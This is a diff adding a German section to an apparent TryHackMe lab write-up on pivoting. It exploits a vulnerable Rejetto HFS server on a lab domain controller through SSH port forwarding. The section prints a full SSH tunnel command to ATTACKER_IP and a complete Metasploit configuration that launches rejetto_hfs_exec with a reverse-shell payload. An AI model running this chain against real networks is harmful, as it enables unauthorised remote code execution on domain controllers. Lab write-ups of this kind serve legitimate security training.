@@ -886,4 +886,57 @@ Wir können nun von unserer Maschine aus über einen SSH Tunnel auf THMIIS per R
 Jetzt wird es etwas schwieriger. Wir befassen uns jetzt mit dem Domain Controller.
 
 Auf dem DC läuft eine unsichere Version von Rejetto HFS (Webfile Server).
+Unser Problem ist allerdings, dass uns der Zugang zu dem anfälligen von unserer Maschine nicht gestattet ist, von der THMJMP2 allerdings schon. Nicht nur das, denn auch ausgehende Verbindungen vom THMDC sind nur innerhalb des eigenen Netzwerks möglich, was uns leider die Möglichkeit einer Reverse Shell nimmt. Um das ganze noch schlimmer zu machen verlangt der Rejetto HFS Exploit einen HTTP Server auf unserer Attacker Maschine um den finalen Payload zu triggern. Da aber keine ausgehenden Verbindungen möglich sind, müssen wir einen anderen Weg finden, einen Webserver in diesem Netzwerk zu hosten. Wir können Port Weiterleitungen nutzen, um all die Probleme in den Griff zu bekommen. 
+
+Als erstes schauen wir uns an, wie der Exploit funktioniert. Zuerst verbindet sich der Exploit zum HFS Port (RPORT in Metasploit) um eine zweite Verbindung zu triggern. Die zweite Verbindung führt zu unserer Attacker Maschine auf SRVPORT, wo ein Webserver den finalen Payload bereitstellt. Zum Schluß wird dann der Payload ausgeführt und eine Reverse Shell zurückgesendet auf dem LPORT:
+
+![alt text](images/image15.png)
+
+Mit diesem Wissen können wir also SSH verwenden, um einige Ports von der Attacker Maschine zur THMJMP2 Maschine weiterzuleiten (SRVPORT und LPORT) und den RPORT des THMDC durch THMJMP2 zu erreichen. Wir müssen also 3 Port Weiterleitungen einrichten um den Exploit zum laufen zu bringen:
+
+![alt text](images/image16.png)
+
+Rejetto HFS hört auf Port 80 auf THMDC, also müssen wir für diesen einen Tunnel zu uns zurück erstellen durch die THMJMP2 Maschine. Wenn Port 80 bereits durch einen anderen Service belegt ist, müssen wir Port 80 auf THMDC mit einem anderen Port verbinden der noch nicht belegt ist. Da haben wir im Prinzip die frei Wahl, nutzen aber jetzt Port 8888. Wenn wir eine SSH Verbindung zu THMJMP2 erstellen und Portwarding betreiben wollen, müssen folgendes unserem Befehl hinzufügen:
+
+>-R 8888:thmdc.za.tryhackme.com:80
+
+Für die beiden Ports SRVPORT und LPORT wählen wir einfach irgendwelchen zufälligen Ports wie bspw. SRVPORT=31337 und LPORT=31338.
+Um diese Ports an THMJMP2 von unserer Maschine aus weiterzuleiten fügen wir unserem SSH Command folgendes hinzu:
+
+>-L *:31337:127.0.0.1:31337 sowie -L *:31338:127.0.0.1:31338
+
+Jetzt fügen wir den gesamten Befehl zusammen und erhalten folgendes:
+
+```bash
+ssh tunneluser@ATTACKER_IP -R 8888:thmdc.za.tryhackme.com:80 -L *:31337:127.0.0.1:31337 -L *:31338:127.0.0.1:31338 -N
+```
+
+Das ganze müssen wir jetzt auf der Pivot Maschine ausführen. Hier hatte ich allerdings das Problem, dass auf meiner Attacker Maschine der Port 22 nicht offen war und somit keine SSH Verbindungen zu mir aufgebaut werden konnten. Ich habe ständig den Fehler bekommen, dass die Verbindung abgelehnt wurde. 
+
+**Daher muss man den Port 22 in der /etc/ssh/sshd_config auskommentieren. Danach startet man den SSH Service mit systemctl restart ssh neu und führt den oben genannten Befehl aus.**
+
+Dann muss man nur noch in Metasploit den Rejetto Exploit konfigurieren z.b. so:
+
+```bash
+user@AttackBox$ msfconsole
+msf6 > use rejetto_hfs_exec
+msf6 exploit(windows/http/rejetto_hfs_exec) > set payload windows/shell_reverse_tcp
+
+msf6 exploit(windows/http/rejetto_hfs_exec) > set lhost thmjmp2.za.tryhackme.com
+msf6 exploit(windows/http/rejetto_hfs_exec) > set ReverseListenerBindAddress 127.0.0.1
+msf6 exploit(windows/http/rejetto_hfs_exec) > set lport 31338 
+msf6 exploit(windows/http/rejetto_hfs_exec) > set srvhost 127.0.0.1
+msf6 exploit(windows/http/rejetto_hfs_exec) > set srvport 31337
+
+msf6 exploit(windows/http/rejetto_hfs_exec) > set rhosts 127.0.0.1
+msf6 exploit(windows/http/rejetto_hfs_exec) > set rport 8888
+msf6 exploit(windows/http/rejetto_hfs_exec) > exploit
+```
+
+Nach ausführen des Exploits haben Zugriff auf den THMDC bzw. Domain Controller.
+
+
+
+
+
 
